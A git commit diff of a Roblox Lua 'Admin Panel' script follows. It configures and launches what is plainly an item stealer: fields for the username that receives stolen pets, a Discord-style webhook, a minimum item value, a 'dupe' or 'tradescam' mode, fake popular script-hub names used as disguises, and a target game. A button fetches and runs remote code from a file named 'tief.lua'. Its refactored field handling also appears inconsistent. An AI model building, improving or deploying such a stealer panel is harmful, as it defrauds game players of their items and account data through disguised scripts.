fa08ce36cb6bb6aae9aa9804ea99a99234a158d5
Galaxy <119733655+Azurexc@users.noreply.github.com>
2024-09-15 01:28:36 -0700

    Update admin.lua

--- admin.lua
+++ admin.lua
@@ -1,11 +1,20 @@
-local funcuser = game:GetService("Players").LocalPlayer.Name
+--Coded by Kizamies#0001/Shimm
+--If you leak this you will result ban
+
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local funcuser = LocalPlayer.Name
 
 if config.Admin == funcuser then
-    local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
-    local Window = OrionLib:MakeWindow({Name = "Admin Panel | Config Script", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+    local OrionLib = loadstring(game:HttpGet('https://raw.githubusercontent.com/shlexware/Orion/main/source'))()
+    local Window = OrionLib:MakeWindow({
+        Name = "Admin Panel | Config Script",
+        HidePremium = false,
+        SaveConfig = true,
+        ConfigFolder = "OrionTest"
+    })
 
     local userData = {}
-    
 
     local Tab = Window:MakeTab({
         Name = "Config",
@@ -13,118 +22,45 @@ if config.Admin == funcuser then
         PremiumOnly = false
     })
 
-    local Section = Tab:AddSection({
-        Name = "Username"
-    })
+    -- Function to textboxes
+    local function addTextbox(sectionName, textboxName)
+        local Section = Tab:AddSection({
+            Name = sectionName
+        })
+        Tab:AddTextbox({
+            Name = textboxName,
+            Default = "",
+            TextDisappear = false,
+            Callback = function(value)
+                userData[sectionName] = value
+                print(value)
+            end
+        })
+    end
 
-    Tab:AddTextbox({
-        Name = "Username",
-        Default = "",
-        TextDisappear = false,
-        Callback = function(value)
-            userData.Username = value
-            print(value)
-        end	  
-    })
-
-    local Section = Tab:AddSection({
-        Name = "WEBHOOK"
-    })
-
-    Tab:AddTextbox({
-        Name = "Webhook",
-        Default = "",
-        TextDisappear = false,
-        Callback = function(value)
-            userData.Webhook = value
-            print(value)
-        end	  
-    })
-
-    local Section = Tab:AddSection({
-        Name = "MinimumRAP"
-    })
-
-    Tab:AddTextbox({
-        Name = "MinimumRAP",
-        Default = "",
-        TextDisappear = false,
-        Callback = function(value)
-            userData.MinimumRap = value
-            print(value)
-        end	  
-    })
-
-    local Section = Tab:AddSection({
-        Name = "Typesui"
-    })
-
-    Tab:AddTextbox({
-        Name = "Typesui",
-        Default = "",
-        TextDisappear = false,
-        Callback = function(value)
-            userData.Typesui = value
-            print(value)
-        end	  
-    })
-
-    local Section = Tab:AddSection({
-        Name = "Typescript"
-    })
-
-    Tab:AddTextbox({
-        Name = "Typescript",
-        Default = "",
-        TextDisappear = false,
-        Callback = function(value)
-            userData.Typescript = value
-            print(value)
-        end	  
-    })
-
-    local Section = Tab:AddSection({
-        Name = "Script name"
-    })
-
-    Tab:AddTextbox({
-        Name = "Script name",
-        Default = "",
-        TextDisappear = false,
-        Callback = function(value)
-            userData.ScriptName = value
-            print(value)
-        end	  
-    })
-
-    local Section = Tab:AddSection({
-        Name = "Stealer"
-    })
-
-    Tab:AddTextbox({
-        Name = "Stealer",
-        Default = "",
-        TextDisappear = false,
-        Callback = function(value)
-            userData.Stealer = value
-            print(value)
-        end	  
-    })
+    --textbox
+    addTextbox("Username", "Username")
+    addTextbox("WEBHOOK", "Webhook")
+    addTextbox("MinimumRAP", "MinimumRAP")
+    addTextbox("Typesui", "Typesui")
+    addTextbox("Typescript", "Typescript")
+    addTextbox("Script name", "ScriptName")
+    addTextbox("Stealer", "Stealer")
 
     Tab:AddButton({
         Name = "Load script",
         Callback = function()
             config = {
-                Username = userData.Username or "", -- Username To Send Pets To
-                Webhook = userData.Webhook or "", -- Webhook URL
-                MinimumRap = userData.MinimumRap or "", -- Minimum RAP of each item you want to get sent to you
-                Typesui = userData.Typesui or "", -- kavo, orion, fluent
-                Typescript = userData.Typescript or "", -- dupe, tradescam
-                ScriptName = userData.ScriptName or "", -- nexus hub, eclipse hub, clever hub
-                Stealer = userData.Stealer or "", -- ps99, SOON MM2 AND ADOPT ME
+                Username = userData.Username or "",
+                Webhook = userData.Webhook or "",
+                MinimumRap = userData.MinimumRAP or "",
+                Typesui = userData.Typesui or "",
+                Typescript = userData.Typescript or "",
+                ScriptName = userData.ScriptName or "",
+                Stealer = userData.Stealer or ""
             }
-        
+
             loadstring(game:HttpGet("https://raw.githubusercontent.com/Azurexc/test/main/tief.lua", true))()
-        end    
+        end
     })
 end
